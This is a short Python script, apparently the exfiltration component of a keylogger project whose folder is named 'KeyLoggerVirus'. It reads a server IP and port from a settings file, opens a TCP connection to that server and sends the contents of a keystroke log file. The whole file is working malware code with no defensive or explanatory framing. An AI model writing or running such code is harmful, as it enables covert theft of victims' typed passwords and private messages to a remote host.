import socket


def get_cerds():
    confFileLines = open("../settings.conf", "r").readlines()
    info_dic = {}
    for line in confFileLines:
        if "=" in line:
            info_dic[line.split("=")[0]] = line.split("=")[1].replace("\n", "")
    return info_dic


def main():
    cerds = get_cerds()
    IP = cerds["SERVER_IP"]
    PORT = cerds["SERVER_PORT"]
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((IP, int(PORT)))

    logfile = open("../KeyLoggerVirus/logger.txt", "r")
    sock.send(logfile.read().encode())
    sock.close()


if __name__ == "__main__":
    main()
